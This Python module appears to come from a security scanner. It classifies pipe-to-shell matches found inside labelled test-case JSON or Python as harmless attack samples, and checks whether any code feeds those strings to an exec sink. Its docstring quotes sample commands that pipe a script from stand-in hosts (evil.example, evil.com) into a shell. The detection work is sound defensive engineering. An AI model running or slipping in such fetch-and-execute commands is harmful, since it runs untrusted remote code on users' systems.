"""Attack samples a security tool keeps as test or lesson data (verdict audit round 2,
class N2): a guard's bypass corpus (vestige ``corpora/guardfall.json``:
``{"cmd": "curl -s https://evil.example/x.sh | sh", "expect": "SHADOW"}``) or a
self-test case list (ClawVault ``{"name": "Curl Pipe Bash", "category": "commands",
"text": "curl evil.com | bash"}``). The pipe-to-shell string is a sample the tool must
catch, not a command it runs.

A match is a sample (low) only when ALL of these hold:

1. the file is JSON (``.json`` / ``.jsonl``) or Python, not an agent-instruction file
   and not a JSON file a tool executes (``package.json``, MCP configs …);
2. the match sits inside one string value of a ``"key": "…"`` pair in an object whose
   other keys include test-case vocabulary (``expect`` / ``expected`` / ``category`` /
   ``label`` / ``attack_type`` …);
3. the value's key is not one a tool runs (``cmd``, ``command``, ``run``, ``script`` …),
   unless every host it fetches is a reserved name (``evil.example``, ``*.invalid``,
   ``example.com``): that fetches nobody's script even if something runs it;
4. Python: no line of the file hands that key (``case["text"]``, ``.get("text")``) to an
   exec sink. JSON: no code file in view reads that key into an exec sink
   (``shown_text.json_key_executed``, re-checked by the tree pass in
   ``restore_attack_samples``) unless rule 3's reserved-host case holds.
"""
from __future__ import annotations

import re
from pathlib import Path

from src.scanner import pipe_shell

WHY = ("An attack sample in a security tool's test or lesson data (a test case next to "
       "an `expect` / `category` / `label` key): the string the tool must catch, not a "
       "command it runs. Reported for visibility.")

_EXTS = frozenset({".json", ".jsonl", ".py"})
# Sibling keys that mark an object as a test case / labelled sample.
_CASE_KEYS = frozenset({
    "expect", "expected", "expects", "expectation", "expected_result", "expected_output",
    "expected_verdict", "expected_action", "expected_decision", "expected_label",
    "category", "label", "labels", "attack_type", "attack_class", "attack_category",
    "should_block", "should_detect", "must_block",
})
_STR = r'"(?:[^"\\\n]|\\.)*"' + r"|'(?:[^'\\\n]|\\.)*'"
_PAIR_RE = re.compile(r"(?P<k>" + _STR + r")\s*:\s*(?P<v>" + _STR + r"|[^,}\]\s][^,}\]]*)")
_KEY_LINE_RE = re.compile(r"^\s*(?:" + _STR + r")\s*:")
_WINDOW = 25


def _key_name(tok: str) -> str:
    return tok[1:-1]


def _pairs(line: str) -> list[tuple[str, int, int]]:
    """(key, value start, value end) for every ``"key": value`` pair on ``line``."""
    return [(_key_name(m.group("k")), m.start("v"), m.end("v"))
            for m in _PAIR_RE.finditer(line)]


def _object_keys(lines: list[str], idx: int) -> set[str]:
    """Keys of the object holding line ``idx``: the line's own pairs when it opens and
    closes the object (``{"a": 1, "b": 2}``), else the key lines around it at the same
    indentation, up to the object's braces."""
    line = lines[idx]
    keys = {k for k, _a, _b in _pairs(line)}
    if "{" in line and "}" in line:
        return keys
    ind = len(line) - len(line.lstrip())
    for step in (-1, 1):
        j = idx + step
        while 0 <= j < len(lines) and abs(j - idx) <= _WINDOW:
            ln = lines[j]
            if not ln.strip():
                j += step
                continue
            j_ind = len(ln) - len(ln.lstrip())
            if j_ind < ind or ln.strip()[:1] in "{}":
                break
            if j_ind == ind and _KEY_LINE_RE.match(ln):
                keys |= {k for k, _a, _b in _pairs(ln)[:1]}
            j += step
    return keys


def _hosts_reserved(line: str, pattern: re.Pattern[str], file_path: str) -> bool:
    return pipe_shell.reserved_hosts_only(line, pattern, file_path)


_PY_SINK_RE = re.compile(
    r"\bsubprocess\b|\bos\s*\.\s*(?:system|popen|exec\w*|spawn\w*)\s*\(|"
    r"\b(?:exec|eval|Popen|check_output|check_call|getoutput|getstatusoutput)\s*\(|"
    r"\bshell\s*=\s*True\b|\bpty\s*\.\s*spawn\b|\bcommands\s*\.\s*getoutput\b")


def _py_key_executed(key: str, content: str) -> bool:
    """A line of the Python file reads ``key`` on an exec sink line, or binds it
    whole (``cmd = case["text"]``, ``.get("text")``) to a name a sink line uses."""
    k = re.escape(key)
    ref = (r"(?:\[\s*['\"]" + k + r"['\"]\s*\]|\.get\s*\(\s*['\"]" + k + r"['\"]"
           r"|\bgetattr\s*\([^,()]+,\s*['\"]" + k + r"['\"])")
    ref_re = re.compile(ref)
    bind_re = re.compile(r"^\s*([A-Za-z_]\w*)\s*=\s*[\w.\]\[]*" + ref + r"[^()]*\)?\s*$")
    lines = content.split("\n")
    sinks = [ln for ln in lines if _PY_SINK_RE.search(ln)]
    for ln in lines:
        if not ref_re.search(ln):
            continue
        if _PY_SINK_RE.search(ln):
            return True
        bm = bind_re.match(ln)
        if bm:
            var = re.compile(r"(?<![\w.])" + re.escape(bm.group(1)) + r"\b")
            if any(var.search(x) for x in sinks):
                return True
    return False


def sample_key(file_path: str, content: str, lines: list[str], idx: int,
               pattern: re.Pattern[str]) -> str | None:
    """The key of the attack-sample value every pipe-to-shell match on ``lines[idx]``
    sits in, or None (keep the finding). The key is returned with a leading ``!`` when
    the reserved-host case decided it (no tree re-check needed)."""
    p = Path(file_path)
    name = p.name.lower()
    if p.suffix.lower() not in _EXTS:
        return None
    from src.scanner.package_context import is_agent_instruction_file
    from src.scanner.shown_text import _EXEC_KEY_RE, _EXECUTED_JSON_NAMES
    if name in _EXECUTED_JSON_NAMES or name.endswith(".mcp.json"):
        return None
    # A JSON file in a skill / prompts dir is text an agent reads; a .py there is code.
    if p.suffix.lower() != ".py" and is_agent_instruction_file(file_path):
        return None
    line = lines[idx]
    matches = [(m.start(), m.end()) for m in pattern.finditer(line)]
    if not matches:
        return None
    pairs = _pairs(line)
    owners = {next((k for k, a, b in pairs if a <= ms and me <= b), None)
              for ms, me in matches}
    if len(owners) != 1 or None in owners:
        return None
    key = owners.pop()
    if not re.fullmatch(r"[A-Za-z_][\w.-]{0,63}", key):
        return None
    if not {k.lower() for k in _object_keys(lines, idx) - {key}} & _CASE_KEYS:
        return None
    if _hosts_reserved(line, pattern, file_path):
        return "!" + key
    if _EXEC_KEY_RE.match(key):
        return None
    if p.suffix.lower() == ".py" and _py_key_executed(key, content):
        return None
    return key


def restore_attack_samples(findings: list, texts: dict[str, str]) -> list:
    """Tree pass: a JSON attack sample lowered per file gets its severity back when
    code in view reads its key into an exec sink (``shown_text.json_key_executed``).
    Reserved-host samples and Python samples (checked in their own file) are final."""
    from src.scanner.shown_text import json_key_executed
    for f in findings:
        pre = getattr(f, "attack_pre", None)
        if pre is None or f.severity != "low" or f.remediation != WHY:
            continue
        key, sev, payload = pre
        path = getattr(f, "file_path", "") or ""
        if key.startswith("!") or Path(path).suffix.lower() == ".py":
            continue
        if path not in texts or json_key_executed(key, path, texts):
            f.severity, f.remediation = sev, ""
            if hasattr(f, "payload"):
                f.payload = payload
    return findings
